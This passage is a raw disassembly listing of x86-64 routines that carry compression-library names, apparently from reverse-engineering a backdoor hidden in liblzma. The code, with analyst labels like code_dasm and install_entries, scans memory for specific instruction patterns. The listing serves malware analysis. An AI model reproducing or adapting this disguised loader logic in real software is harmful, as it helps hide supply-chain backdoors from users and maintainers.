.text.lzma_lzma_encoder_resea:000000000000335D                 mov     esi, 1E0h
.text.lzma_lzma_encoder_resea:0000000000003362                 rep stosd
.text.lzma_lzma_encoder_resea:0000000000003364                 xor     eax, eax
.text.lzma_lzma_encoder_resea:0000000000003366                 mov     rcx, rbx
.text.lzma_lzma_encoder_resea:0000000000003369                 mov     rdi, r9
.text.lzma_lzma_encoder_resea:000000000000336C                 mov     [r8], rax
.text.lzma_lzma_encoder_resea:000000000000336F                 call    _Llzma_auto_decode_1 ; PIC mode
.text.lzma_lzma_encoder_resea:0000000000003374                 mov     r14, rax
.text.lzma_lzma_encoder_resea:0000000000003377                 test    rax, rax
.text.lzma_lzma_encoder_resea:000000000000337A                 lea     rax, [rsp+108h+var_D8]
.text.lzma_lzma_encoder_resea:000000000000337F                 mov     [rsp+108h+var_F8], rax
.text.lzma_lzma_encoder_resea:0000000000003384                 jnz     short loc_33C6
.text.lzma_lzma_encoder_resea:0000000000003386
.text.lzma_lzma_encoder_resea:0000000000003386 loc_3386:                               ; CODE XREF: sub_3330+9B↓j
.text.lzma_lzma_encoder_resea:0000000000003386                                         ; sub_3330+312↓j
.text.lzma_lzma_encoder_resea:0000000000003386                 xor     eax, eax
.text.lzma_lzma_encoder_resea:0000000000003388                 jmp     loc_3658
.text.lzma_lzma_encoder_resea:000000000000338D ; ---------------------------------------------------------------------------
.text.lzma_lzma_encoder_resea:000000000000338D
.text.lzma_lzma_encoder_resea:000000000000338D loc_338D:                               ; CODE XREF: sub_3330+99↓j
.text.lzma_lzma_encoder_resea:000000000000338D                 mov     rdi, [rsp+108h+var_F8]
.text.lzma_lzma_encoder_resea:0000000000003392                 mov     rdx, rbx
.text.lzma_lzma_encoder_resea:0000000000003395                 mov     rsi, r14
.text.lzma_lzma_encoder_resea:0000000000003398                 call    code_dasm       ; PIC mode
.text.lzma_lzma_encoder_resea:000000000000339D                 test    eax, eax
.text.lzma_lzma_encoder_resea:000000000000339F                 jz      loc_3647
.text.lzma_lzma_encoder_resea:00000000000033A5                 mov     eax, [rsp+108h+var_B0]
.text.lzma_lzma_encoder_resea:00000000000033A9                 mov     edx, eax
.text.lzma_lzma_encoder_resea:00000000000033AB                 and     edx, 0FFFFFFFDh
.text.lzma_lzma_encoder_resea:00000000000033AE                 cmp     edx, 0B1h
.text.lzma_lzma_encoder_resea:00000000000033B4                 jnz     loc_35B3
.text.lzma_lzma_encoder_resea:00000000000033BA                 cmp     [rsp+108h+var_BB], 3
.text.lzma_lzma_encoder_resea:00000000000033BF                 jz      short loc_33CD
.text.lzma_lzma_encoder_resea:00000000000033C1
.text.lzma_lzma_encoder_resea:00000000000033C1 loc_33C1:                               ; CODE XREF: sub_3330+AD↓j
.text.lzma_lzma_encoder_resea:00000000000033C1                                         ; sub_3330+120↓j ...
.text.lzma_lzma_encoder_resea:00000000000033C1                 add     r14, [rsp+108h+var_D0]
.text.lzma_lzma_encoder_resea:00000000000033C6
.text.lzma_lzma_encoder_resea:00000000000033C6 loc_33C6:                               ; CODE XREF: sub_3330+54↑j
.text.lzma_lzma_encoder_resea:00000000000033C6                                         ; sub_3330+31A↓j
.text.lzma_lzma_encoder_resea:00000000000033C6                 cmp     r14, rbx
.text.lzma_lzma_encoder_resea:00000000000033C9                 jb      short loc_338D
.text.lzma_lzma_encoder_resea:00000000000033CB                 jmp     short loc_3386
.text.lzma_lzma_encoder_resea:00000000000033CD ; ---------------------------------------------------------------------------
.text.lzma_lzma_encoder_resea:00000000000033CD
.text.lzma_lzma_encoder_resea:00000000000033CD loc_33CD:                               ; CODE XREF: sub_3330+8F↑j
.text.lzma_lzma_encoder_resea:00000000000033CD                 mov     al, byte ptr [rsp+108h+var_C8]
.text.lzma_lzma_encoder_resea:00000000000033D1                 mov     edx, eax
.text.lzma_lzma_encoder_resea:00000000000033D3                 and     dl, 20h
.text.lzma_lzma_encoder_resea:00000000000033D6                 jz      short loc_33DF
.text.lzma_lzma_encoder_resea:00000000000033D8                 test    [rsp+108h+var_BD], 8
.text.lzma_lzma_encoder_resea:00000000000033DD                 jnz     short loc_33C1
.text.lzma_lzma_encoder_resea:00000000000033DF
.text.lzma_lzma_encoder_resea:00000000000033DF loc_33DF:                               ; CODE XREF: sub_3330+A6↑j
.text.lzma_lzma_encoder_resea:00000000000033DF                 and     eax, 40h
.text.lzma_lzma_encoder_resea:00000000000033E2                 test    [rsp+108h+var_C8], 1040h
.text.lzma_lzma_encoder_resea:00000000000033E9                 jnz     short loc_33F1
.text.lzma_lzma_encoder_resea:00000000000033EB                 test    al, al
.text.lzma_lzma_encoder_resea:00000000000033ED                 jnz     short loc_3435
.text.lzma_lzma_encoder_resea:00000000000033EF                 jmp     short loc_3458
.text.lzma_lzma_encoder_resea:00000000000033F1 ; ---------------------------------------------------------------------------
.text.lzma_lzma_encoder_resea:00000000000033F1
.text.lzma_lzma_encoder_resea:00000000000033F1 loc_33F1:                               ; CODE XREF: sub_3330+B9↑j
.text.lzma_lzma_encoder_resea:00000000000033F1                 test    al, al
.text.lzma_lzma_encoder_resea:00000000000033F3                 jz      short loc_3411
.text.lzma_lzma_encoder_resea:00000000000033F5                 mov     r8b, [rsp+108h+var_BA]
.text.lzma_lzma_encoder_resea:00000000000033FA                 mov     al, [rsp+108h+var_B9]
.text.lzma_lzma_encoder_resea:00000000000033FE                 test    dl, dl
.text.lzma_lzma_encoder_resea:0000000000003400                 jz      short loc_344D
.text.lzma_lzma_encoder_resea:0000000000003402                 movzx   edx, [rsp+108h+var_BD]
.text.lzma_lzma_encoder_resea:0000000000003407                 add     edx, edx
.text.lzma_lzma_encoder_resea:0000000000003409                 and     edx, 8
.text.lzma_lzma_encoder_resea:000000000000340C                 or      r8d, edx
.text.lzma_lzma_encoder_resea:000000000000340F                 jmp     short loc_3440
.text.lzma_lzma_encoder_resea:0000000000003411 ; ---------------------------------------------------------------------------
.text.lzma_lzma_encoder_resea:0000000000003411
.text.lzma_lzma_encoder_resea:0000000000003411 loc_3411:                               ; CODE XREF: sub_3330+C3↑j
.text.lzma_lzma_encoder_resea:0000000000003411                 mov     r8b, byte ptr [rsp+108h+var_C8+1]
.text.lzma_lzma_encoder_resea:0000000000003416                 and     r8b, 10h
.text.lzma_lzma_encoder_resea:000000000000341A                 jz      short loc_345B
.text.lzma_lzma_encoder_resea:000000000000341C                 mov     r8b, [rsp+108h+var_B8]
.text.lzma_lzma_encoder_resea:0000000000003421                 test    dl, dl
.text.lzma_lzma_encoder_resea:0000000000003423                 jz      short loc_344D
.text.lzma_lzma_encoder_resea:0000000000003425                 movzx   edx, [rsp+108h+var_BD]
.text.lzma_lzma_encoder_resea:000000000000342A                 shl     edx, 3
.text.lzma_lzma_encoder_resea:000000000000342D                 and     edx, 8
.text.lzma_lzma_encoder_resea:0000000000003430                 or      r8d, edx
.text.lzma_lzma_encoder_resea:0000000000003433                 jmp     short loc_344D
.text.lzma_lzma_encoder_resea:0000000000003435 ; ---------------------------------------------------------------------------
.text.lzma_lzma_encoder_resea:0000000000003435
.text.lzma_lzma_encoder_resea:0000000000003435 loc_3435:                               ; CODE XREF: sub_3330+BD↑j
.text.lzma_lzma_encoder_resea:0000000000003435                 mov     al, [rsp+108h+var_B9]
.text.lzma_lzma_encoder_resea:0000000000003439                 xor     r8d, r8d
.text.lzma_lzma_encoder_resea:000000000000343C                 test    dl, dl
.text.lzma_lzma_encoder_resea:000000000000343E                 jz      short loc_344D
.text.lzma_lzma_encoder_resea:0000000000003440
.text.lzma_lzma_encoder_resea:0000000000003440 loc_3440:                               ; CODE XREF: sub_3330+DF↑j
.text.lzma_lzma_encoder_resea:0000000000003440                 movzx   edx, [rsp+108h+var_BD]
.text.lzma_lzma_encoder_resea:0000000000003445                 shl     edx, 3
.text.lzma_lzma_encoder_resea:0000000000003448                 and     edx, 8
.text.lzma_lzma_encoder_resea:000000000000344B                 or      eax, edx
.text.lzma_lzma_encoder_resea:000000000000344D
.text.lzma_lzma_encoder_resea:000000000000344D loc_344D:                               ; CODE XREF: sub_3330+D0↑j
.text.lzma_lzma_encoder_resea:000000000000344D                                         ; sub_3330+F3↑j ...
.text.lzma_lzma_encoder_resea:000000000000344D                 cmp     al, r8b
.text.lzma_lzma_encoder_resea:0000000000003450                 jnz     loc_33C1
.text.lzma_lzma_encoder_resea:0000000000003456                 jmp     short loc_345B
.text.lzma_lzma_encoder_resea:0000000000003458 ; ---------------------------------------------------------------------------
.text.lzma_lzma_encoder_resea:0000000000003458
.text.lzma_lzma_encoder_resea:0000000000003458 loc_3458:                               ; CODE XREF: sub_3330+BF↑j
.text.lzma_lzma_encoder_resea:0000000000003458                 xor     r8d, r8d
.text.lzma_lzma_encoder_resea:000000000000345B
.text.lzma_lzma_encoder_resea:000000000000345B loc_345B:                               ; CODE XREF: sub_3330+EA↑j
.text.lzma_lzma_encoder_resea:000000000000345B                                         ; sub_3330+126↑j
.text.lzma_lzma_encoder_resea:000000000000345B                 xor     eax, eax
.text.lzma_lzma_encoder_resea:000000000000345D                 mov     ecx, 16h
.text.lzma_lzma_encoder_resea:0000000000003462                 mov     rsi, [rsp+108h+var_D0]
.text.lzma_lzma_encoder_resea:0000000000003467                 lea     rdi, [rsp+108h+var_80]
.text.lzma_lzma_encoder_resea:000000000000346F                 rep stosd
.text.lzma_lzma_encoder_resea:0000000000003471                 lea     rax, [rsp+108h+var_80]
.text.lzma_lzma_encoder_resea:0000000000003479                 add     rsi, [rsp+108h+var_D8]
.text.lzma_lzma_encoder_resea:000000000000347E                 mov     [rsp+108h+var_F0], rax
.text.lzma_lzma_encoder_resea:0000000000003483
.text.lzma_lzma_encoder_resea:0000000000003483 loc_3483:                               ; CODE XREF: sub_3330+27E↓j
.text.lzma_lzma_encoder_resea:0000000000003483                 cmp     rsi, rbx
.text.lzma_lzma_encoder_resea:0000000000003486                 jnb     loc_33C1
.text.lzma_lzma_encoder_resea:000000000000348C                 cmp     ecx, 5
.text.lzma_lzma_encoder_resea:000000000000348F                 ja      loc_33C1
.text.lzma_lzma_encoder_resea:0000000000003495                 mov     rdi, [rsp+108h+var_F0]
.text.lzma_lzma_encoder_resea:000000000000349A                 mov     rdx, rbx
.text.lzma_lzma_encoder_resea:000000000000349D                 mov     [rsp+108h+var_D9], r8b
.text.lzma_lzma_encoder_resea:00000000000034A2                 mov     [rsp+108h+var_E0], ecx
.text.lzma_lzma_encoder_resea:00000000000034A6                 mov     [rsp+108h+var_E8], rsi
.text.lzma_lzma_encoder_resea:00000000000034AB                 call    code_dasm       ; PIC mode
.text.lzma_lzma_encoder_resea:00000000000034B0                 test    eax, eax
.text.lzma_lzma_encoder_resea:00000000000034B2                 jz      loc_33C1
.text.lzma_lzma_encoder_resea:00000000000034B8                 mov     eax, [rsp+108h+var_58]
.text.lzma_lzma_encoder_resea:00000000000034BF                 mov     rsi, [rsp+108h+var_E8]
.text.lzma_lzma_encoder_resea:00000000000034C4                 mov     ecx, [rsp+108h+var_E0]
.text.lzma_lzma_encoder_resea:00000000000034C8                 mov     r8b, [rsp+108h+var_D9]
.text.lzma_lzma_encoder_resea:00000000000034CD                 cmp     eax, 109h
.text.lzma_lzma_encoder_resea:00000000000034D2                 jnz     loc_3599
.text.lzma_lzma_encoder_resea:00000000000034D8                 mov     eax, [rsp+108h+var_64]
.text.lzma_lzma_encoder_resea:00000000000034DF                 and     eax, 0FF00FF00h
.text.lzma_lzma_encoder_resea:00000000000034E4                 cmp     eax, 5000000h
.text.lzma_lzma_encoder_resea:00000000000034E9                 jnz     loc_35A4
.text.lzma_lzma_encoder_resea:00000000000034EF                 xor     eax, eax
.text.lzma_lzma_encoder_resea:00000000000034F1                 test    [rsp+108h+var_70], 1040h
.text.lzma_lzma_encoder_resea:00000000000034FB                 jz      short loc_3548
.text.lzma_lzma_encoder_resea:00000000000034FD                 mov     dl, byte ptr [rsp+108h+var_70]
.text.lzma_lzma_encoder_resea:0000000000003504                 test    dl, 40h
.text.lzma_lzma_encoder_resea:0000000000003507                 jz      short loc_3521
.text.lzma_lzma_encoder_resea:0000000000003509                 and     dl, 20h
.text.lzma_lzma_encoder_resea:000000000000350C                 mov     al, byte ptr [rsp+108h+var_64+2]
.text.lzma_lzma_encoder_resea:0000000000003513                 jz      short loc_3548
.text.lzma_lzma_encoder_resea:0000000000003515                 movzx   edx, [rsp+108h+var_65]
.text.lzma_lzma_encoder_resea:000000000000351D                 add     edx, edx
.text.lzma_lzma_encoder_resea:000000000000351F                 jmp     short loc_3543
.text.lzma_lzma_encoder_resea:0000000000003521 ; ---------------------------------------------------------------------------
.text.lzma_lzma_encoder_resea:0000000000003521
.text.lzma_lzma_encoder_resea:0000000000003521 loc_3521:                               ; CODE XREF: sub_3330+1D7↑j
.text.lzma_lzma_encoder_resea:0000000000003521                 mov     al, byte ptr [rsp+108h+var_70+1]
.text.lzma_lzma_encoder_resea:0000000000003528                 and     al, 10h
.text.lzma_lzma_encoder_resea:000000000000352A                 jz      short loc_3548
.text.lzma_lzma_encoder_resea:000000000000352C                 and     dl, 20h
.text.lzma_lzma_encoder_resea:000000000000352F                 mov     al, [rsp+108h+var_60]
.text.lzma_lzma_encoder_resea:0000000000003536                 jz      short loc_3548
.text.lzma_lzma_encoder_resea:0000000000003538                 movzx   edx, [rsp+108h+var_65]
.text.lzma_lzma_encoder_resea:0000000000003540                 shl     edx, 3
.text.lzma_lzma_encoder_resea:0000000000003543
.text.lzma_lzma_encoder_resea:0000000000003543 loc_3543:                               ; CODE XREF: sub_3330+1EF↑j
.text.lzma_lzma_encoder_resea:0000000000003543                 and     edx, 8
.text.lzma_lzma_encoder_resea:0000000000003546                 or      eax, edx
.text.lzma_lzma_encoder_resea:0000000000003548
.text.lzma_lzma_encoder_resea:0000000000003548 loc_3548:                               ; CODE XREF: sub_3330+1CB↑j
.text.lzma_lzma_encoder_resea:0000000000003548                                         ; sub_3330+1E3↑j ...
.text.lzma_lzma_encoder_resea:0000000000003548                 cmp     al, r8b
.text.lzma_lzma_encoder_resea:000000000000354B                 jnz     short loc_35A4
.text.lzma_lzma_encoder_resea:000000000000354D                 xor     eax, eax
.text.lzma_lzma_encoder_resea:000000000000354F                 test    byte ptr [rsp+108h+var_70+1], 1
.text.lzma_lzma_encoder_resea:0000000000003557                 jz      short loc_3571
.text.lzma_lzma_encoder_resea:0000000000003559                 mov     rax, [rsp+108h+var_50]
.text.lzma_lzma_encoder_resea:0000000000003561                 add     rax, [rsp+108h+var_80]
.text.lzma_lzma_encoder_resea:0000000000003569                 add     rax, [rsp+108h+var_78]
.text.lzma_lzma_encoder_resea:0000000000003571
.text.lzma_lzma_encoder_resea:0000000000003571 loc_3571:                               ; CODE XREF: sub_3330+227↑j
.text.lzma_lzma_encoder_resea:0000000000003571                 lea     rdx, [rax-18h]
.text.lzma_lzma_encoder_resea:0000000000003575                 cmp     rdx, r13
.text.lzma_lzma_encoder_resea:0000000000003578                 setnb   r10b
.text.lzma_lzma_encoder_resea:000000000000357C                 cmp     rax, 18h
.text.lzma_lzma_encoder_resea:0000000000003580                 setnz   dil
.text.lzma_lzma_encoder_resea:0000000000003584                 test    r10b, dil
.text.lzma_lzma_encoder_resea:0000000000003587                 jz      short loc_35A4
.text.lzma_lzma_encoder_resea:0000000000003589                 add     rax, 4
.text.lzma_lzma_encoder_resea:000000000000358D                 cmp     [rsp+108h+var_100], rax
.text.lzma_lzma_encoder_resea:0000000000003592                 jb      short loc_35A4
.text.lzma_lzma_encoder_resea:0000000000003594                 jmp     loc_364F
.text.lzma_lzma_encoder_resea:0000000000003599 ; ---------------------------------------------------------------------------
.text.lzma_lzma_encoder_resea:0000000000003599
.text.lzma_lzma_encoder_resea:0000000000003599 loc_3599:                               ; CODE XREF: sub_3330+1A2↑j
.text.lzma_lzma_encoder_resea:0000000000003599                 cmp     eax, 0A5FEh
.text.lzma_lzma_encoder_resea:000000000000359E                 jz      loc_33C1
.text.lzma_lzma_encoder_resea:00000000000035A4
.text.lzma_lzma_encoder_resea:00000000000035A4 loc_35A4:                               ; CODE XREF: sub_3330+1B9↑j
.text.lzma_lzma_encoder_resea:00000000000035A4                                         ; sub_3330+21B↑j ...
.text.lzma_lzma_encoder_resea:00000000000035A4                 add     rsi, [rsp+108h+var_78]
.text.lzma_lzma_encoder_resea:00000000000035AC                 inc     ecx
.text.lzma_lzma_encoder_resea:00000000000035AE                 jmp     loc_3483
.text.lzma_lzma_encoder_resea:00000000000035B3 ; ---------------------------------------------------------------------------
.text.lzma_lzma_encoder_resea:00000000000035B3
.text.lzma_lzma_encoder_resea:00000000000035B3 loc_35B3:                               ; CODE XREF: sub_3330+84↑j
.text.lzma_lzma_encoder_resea:00000000000035B3                 cmp     eax, 147h
.text.lzma_lzma_encoder_resea:00000000000035B8                 jnz     short loc_362C
.text.lzma_lzma_encoder_resea:00000000000035BA                 test    [rsp+108h+var_BD], 8
.text.lzma_lzma_encoder_resea:00000000000035BF                 jnz     loc_33C1
.text.lzma_lzma_encoder_resea:00000000000035C5                 mov     eax, [rsp+4Ch]
.text.lzma_lzma_encoder_resea:00000000000035C9                 xor     al, al
.text.lzma_lzma_encoder_resea:00000000000035CB                 cmp     eax, 5000000h
.text.lzma_lzma_encoder_resea:00000000000035D0                 jnz     loc_33C1
.text.lzma_lzma_encoder_resea:00000000000035D6                 mov     dl, byte ptr [rsp+108h+var_C8+1]
.text.lzma_lzma_encoder_resea:00000000000035DA                 test    dl, 8
.text.lzma_lzma_encoder_resea:00000000000035DD                 jz      loc_33C1
.text.lzma_lzma_encoder_resea:00000000000035E3                 mov     rax, [rsp+108h+var_98]
.text.lzma_lzma_encoder_resea:00000000000035E8                 test    rax, rax
.text.lzma_lzma_encoder_resea:00000000000035EB                 jnz     loc_33C1
.text.lzma_lzma_encoder_resea:00000000000035F1                 and     dl, 1
.text.lzma_lzma_encoder_resea:00000000000035F4                 jz      short loc_3605
.text.lzma_lzma_encoder_resea:00000000000035F6                 mov     rax, [rsp+108h+var_A8]
.text.lzma_lzma_encoder_resea:00000000000035FB                 add     rax, [rsp+108h+var_D8]
.text.lzma_lzma_encoder_resea:0000000000003600                 add     rax, [rsp+108h+var_D0]
.text.lzma_lzma_encoder_resea:0000000000003605
.text.lzma_lzma_encoder_resea:0000000000003605 loc_3605:                               ; CODE XREF: sub_3330+2C4↑j
.text.lzma_lzma_encoder_resea:0000000000003605                 lea     rdx, [rax-18h]
.text.lzma_lzma_encoder_resea:0000000000003609                 add     rax, 4
.text.lzma_lzma_encoder_resea:000000000000360D                 cmp     [rsp+108h+var_100], rax
.text.lzma_lzma_encoder_resea:0000000000003612                 jb      loc_33C1
.text.lzma_lzma_encoder_resea:0000000000003618                 cmp     r13, rdx
.text.lzma_lzma_encoder_resea:000000000000361B                 ja      loc_33C1
.text.lzma_lzma_encoder_resea:0000000000003621                 test    rdx, rdx
.text.lzma_lzma_encoder_resea:0000000000003624                 jz      loc_33C1
.text.lzma_lzma_encoder_resea:000000000000362A                 jmp     short loc_364F
.text.lzma_lzma_encoder_resea:000000000000362C ; ---------------------------------------------------------------------------
.text.lzma_lzma_encoder_resea:000000000000362C
.text.lzma_lzma_encoder_resea:000000000000362C loc_362C:                               ; CODE XREF: sub_3330+288↑j
.text.lzma_lzma_encoder_resea:000000000000362C                 cmp     eax, 0A5FEh
.text.lzma_lzma_encoder_resea:0000000000003631                 jnz     loc_33C1
.text.lzma_lzma_encoder_resea:0000000000003637                 cmp     r15, [rsp+108h+var_D8]
.text.lzma_lzma_encoder_resea:000000000000363C                 jz      loc_33C1
.text.lzma_lzma_encoder_resea:0000000000003642                 jmp     loc_3386
.text.lzma_lzma_encoder_resea:0000000000003647 ; ---------------------------------------------------------------------------
.text.lzma_lzma_encoder_resea:0000000000003647
.text.lzma_lzma_encoder_resea:0000000000003647 loc_3647:                               ; CODE XREF: sub_3330+6F↑j
.text.lzma_lzma_encoder_resea:0000000000003647                 inc     r14
.text.lzma_lzma_encoder_resea:000000000000364A                 jmp     loc_33C6
.text.lzma_lzma_encoder_resea:000000000000364F ; ---------------------------------------------------------------------------
.text.lzma_lzma_encoder_resea:000000000000364F
.text.lzma_lzma_encoder_resea:000000000000364F loc_364F:                               ; CODE XREF: sub_3330+264↑j
.text.lzma_lzma_encoder_resea:000000000000364F                                         ; sub_3330+2FA↑j
.text.lzma_lzma_encoder_resea:000000000000364F                 mov     [r12], rdx
.text.lzma_lzma_encoder_resea:0000000000003653                 mov     eax, 1
.text.lzma_lzma_encoder_resea:0000000000003658
.text.lzma_lzma_encoder_resea:0000000000003658 loc_3658:                               ; CODE XREF: sub_3330+58↑j
.text.lzma_lzma_encoder_resea:0000000000003658                 add     rsp, 0E0h
.text.lzma_lzma_encoder_resea:000000000000365F                 pop     rbx
.text.lzma_lzma_encoder_resea:0000000000003660                 pop     r12
.text.lzma_lzma_encoder_resea:0000000000003662                 pop     r13
.text.lzma_lzma_encoder_resea:0000000000003664                 pop     r14
.text.lzma_lzma_encoder_resea:0000000000003666                 pop     r15
.text.lzma_lzma_encoder_resea:0000000000003668                 retn
.text.lzma_lzma_encoder_resea:0000000000003668 sub_3330        endp
.text.lzma_lzma_encoder_resea:0000000000003668
.text.lzma_lzma_encoder_resea:0000000000003668 _text_lzma_lzma_encoder_resea ends
.text.lzma_lzma_encoder_resea:0000000000003668
.text.lzma_bufcpa:0000000000003670 ; ===========================================================================
.text.lzma_bufcpa:0000000000003670
.text.lzma_bufcpa:0000000000003670 ; Segment type: Pure code
.text.lzma_bufcpa:0000000000003670 ; Segment permissions: Read/Execute
.text.lzma_bufcpa:0000000000003670 _text_lzma_bufcpa segment para public 'CODE' use64
.text.lzma_bufcpa:0000000000003670                 assume cs:_text_lzma_bufcpa
.text.lzma_bufcpa:0000000000003670                 ;org 3670h
.text.lzma_bufcpa:0000000000003670                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_bufcpa:0000000000003670
.text.lzma_bufcpa:0000000000003670 ; =============== S U B R O U T I N E =======================================
.text.lzma_bufcpa:0000000000003670
.text.lzma_bufcpa:0000000000003670
.text.lzma_bufcpa:0000000000003670 ; __int64 __fastcall Llzma_buf_cpy_0(unsigned __int64, unsigned __int64, unsigned __int64, unsigned __int64, __int64, __int64 *)
.text.lzma_bufcpa:0000000000003670 _Llzma_buf_cpy_0 proc near              ; CODE XREF: install_entries+2C5↓p
.text.lzma_bufcpa:0000000000003670
.text.lzma_bufcpa:0000000000003670 var_130         = qword ptr -130h
.text.lzma_bufcpa:0000000000003670 var_128         = qword ptr -128h
.text.lzma_bufcpa:0000000000003670 var_120         = qword ptr -120h
.text.lzma_bufcpa:0000000000003670 var_118         = qword ptr -118h
.text.lzma_bufcpa:0000000000003670 var_110         = qword ptr -110h
.text.lzma_bufcpa:0000000000003670 var_100         = qword ptr -100h
.text.lzma_bufcpa:0000000000003670 var_F8          = qword ptr -0F8h
.text.lzma_bufcpa:0000000000003670 var_F0          = word ptr -0F0h
.text.lzma_bufcpa:0000000000003670 var_E5          = byte ptr -0E5h
.text.lzma_bufcpa:0000000000003670 var_E2          = byte ptr -0E2h
.text.lzma_bufcpa:0000000000003670 var_E0          = byte ptr -0E0h
.text.lzma_bufcpa:0000000000003670 var_D0          = qword ptr -0D0h
.text.lzma_bufcpa:0000000000003670 var_A8          = qword ptr -0A8h
.text.lzma_bufcpa:0000000000003670
.text.lzma_bufcpa:0000000000003670                 endbr64
.text.lzma_bufcpa:0000000000003674                 push    r15
.text.lzma_bufcpa:0000000000003676                 xor     eax, eax
.text.lzma_bufcpa:0000000000003678                 push    r14
.text.lzma_bufcpa:000000000000367A                 push    r13
.text.lzma_bufcpa:000000000000367C                 push    r12
.text.lzma_bufcpa:000000000000367E                 push    rbx
.text.lzma_bufcpa:000000000000367F                 sub     rsp, 110h
.text.lzma_bufcpa:0000000000003686                 mov     [r9], rax
.text.lzma_bufcpa:0000000000003689                 mov     r15, [r8+8]
.text.lzma_bufcpa:000000000000368D                 mov     [rsp+138h+var_120], rdi
.text.lzma_bufcpa:0000000000003692                 mov     [rsp+138h+var_118], rsi
.text.lzma_bufcpa:0000000000003697                 mov     [rsp+138h+var_130], rcx
.text.lzma_bufcpa:000000000000369C                 test    r15, r15
.text.lzma_bufcpa:000000000000369F                 jz      loc_3843
.text.lzma_bufcpa:00000000000036A5                 xor     eax, eax
.text.lzma_bufcpa:00000000000036A7                 lea     rdi, [rsp+138h+var_A8]
.text.lzma_bufcpa:00000000000036AF                 mov     rbx, rdx
.text.lzma_bufcpa:00000000000036B2                 mov     r12, r9
.text.lzma_bufcpa:00000000000036B5                 mov     ecx, 20h ; ' '
.text.lzma_bufcpa:00000000000036BA                 mov     r14b, 0FFh
.text.lzma_bufcpa:00000000000036BD                 xor     r10d, r10d
.text.lzma_bufcpa:00000000000036C0                 xor     r13d, r13d
.text.lzma_bufcpa:00000000000036C3                 rep stosd
.text.lzma_bufcpa:00000000000036C5                 lea     rdi, [rsp+138h+var_100]
.text.lzma_bufcpa:00000000000036CA                 mov     ecx, 16h
.text.lzma_bufcpa:00000000000036CF                 rep stosd
.text.lzma_bufcpa:00000000000036D1                 lea     rax, [rsp+138h+var_100]
.text.lzma_bufcpa:00000000000036D6                 mov     [rsp+138h+var_128], rax
.text.lzma_bufcpa:00000000000036DB
.text.lzma_bufcpa:00000000000036DB loc_36DB:                               ; CODE XREF: _Llzma_buf_cpy_0+C5↓j
.text.lzma_bufcpa:00000000000036DB                                         ; _Llzma_buf_cpy_0+117↓j ...
.text.lzma_bufcpa:00000000000036DB                 mov     rax, [rsp+138h+var_130]
.text.lzma_bufcpa:00000000000036E0                 cmp     rbx, rax
.text.lzma_bufcpa:00000000000036E3                 jnb     loc_37EF
.text.lzma_bufcpa:00000000000036E9                 mov     rcx, [rsp+138h+var_128]
.text.lzma_bufcpa:00000000000036EE                 mov     rsi, [rsp+138h+var_130]
.text.lzma_bufcpa:00000000000036F3                 mov     rdx, r15
.text.lzma_bufcpa:00000000000036F6                 mov     rdi, rbx
.text.lzma_bufcpa:00000000000036F9                 mov     [rsp+138h+var_110], r10
.text.lzma_bufcpa:00000000000036FE                 call    _Llzma_optimum_normal_0 ; PIC mode
.text.lzma_bufcpa:0000000000003703                 test    eax, eax
.text.lzma_bufcpa:0000000000003705                 jz      loc_37EF
.text.lzma_bufcpa:000000000000370B                 mov     rbx, [rsp+138h+var_F8]
.text.lzma_bufcpa:0000000000003710                 mov     rdx, [rsp+138h+var_128]
.text.lzma_bufcpa:0000000000003715                 xor     r8d, r8d
.text.lzma_bufcpa:0000000000003718                 mov     ecx, 109h
.text.lzma_bufcpa:000000000000371D                 add     rbx, [rsp+138h+var_100]
.text.lzma_bufcpa:0000000000003722                 lea     rsi, [rbx+20h]
.text.lzma_bufcpa:0000000000003726                 mov     rdi, rbx
.text.lzma_bufcpa:0000000000003729                 call    _Llzma_properties_size_0 ; PIC mode
.text.lzma_bufcpa:000000000000372E                 mov     r10, [rsp+138h+var_110]
.text.lzma_bufcpa:0000000000003733                 test    eax, eax
.text.lzma_bufcpa:0000000000003735                 jz      short loc_36DB
.text.lzma_bufcpa:0000000000003737                 test    [rsp+138h+var_F0], 1040h
.text.lzma_bufcpa:000000000000373E                 jz      short loc_3778
.text.lzma_bufcpa:0000000000003740                 mov     al, byte ptr [rsp+138h+var_F0]
.text.lzma_bufcpa:0000000000003744                 test    al, 40h
.text.lzma_bufcpa:0000000000003746                 jz      short loc_375A
.text.lzma_bufcpa:0000000000003748                 mov     r14b, [rsp+138h+var_E2]
.text.lzma_bufcpa:000000000000374D                 test    al, 20h
.text.lzma_bufcpa:000000000000374F                 jz      short loc_3778
.text.lzma_bufcpa:0000000000003751                 movzx   eax, [rsp+138h+var_E5]
.text.lzma_bufcpa:0000000000003756                 add     eax, eax
.text.lzma_bufcpa:0000000000003758                 jmp     short loc_3772
.text.lzma_bufcpa:000000000000375A ; ---------------------------------------------------------------------------
.text.lzma_bufcpa:000000000000375A
.text.lzma_bufcpa:000000000000375A loc_375A:                               ; CODE XREF: _Llzma_buf_cpy_0+D6↑j
.text.lzma_bufcpa:000000000000375A                 test    byte ptr [rsp+138h+var_F0+1], 10h
.text.lzma_bufcpa:000000000000375F                 jz      short loc_378C
.text.lzma_bufcpa:0000000000003761                 mov     r14b, [rsp+138h+var_E0]
.text.lzma_bufcpa:0000000000003766                 test    al, 20h
.text.lzma_bufcpa:0000000000003768                 jz      short loc_3778
.text.lzma_bufcpa:000000000000376A                 movzx   eax, [rsp+138h+var_E5]
.text.lzma_bufcpa:000000000000376F                 shl     eax, 3
.text.lzma_bufcpa:0000000000003772
.text.lzma_bufcpa:0000000000003772 loc_3772:                               ; CODE XREF: _Llzma_buf_cpy_0+E8↑j
.text.lzma_bufcpa:0000000000003772                 and     eax, 8
.text.lzma_bufcpa:0000000000003775                 or      r14d, eax
.text.lzma_bufcpa:0000000000003778
.text.lzma_bufcpa:0000000000003778 loc_3778:                               ; CODE XREF: _Llzma_buf_cpy_0+CE↑j
.text.lzma_bufcpa:0000000000003778                                         ; _Llzma_buf_cpy_0+DF↑j ...
.text.lzma_bufcpa:0000000000003778                 test    r14b, r14b
.text.lzma_bufcpa:000000000000377B                 jz      short loc_378C
.text.lzma_bufcpa:000000000000377D                 mov     rbx, [rsp+138h+var_F8]
.text.lzma_bufcpa:0000000000003782                 add     rbx, [rsp+138h+var_100]
.text.lzma_bufcpa:0000000000003787                 jmp     loc_36DB
.text.lzma_bufcpa:000000000000378C ; ---------------------------------------------------------------------------
.text.lzma_bufcpa:000000000000378C
.text.lzma_bufcpa:000000000000378C loc_378C:                               ; CODE XREF: _Llzma_buf_cpy_0+EF↑j
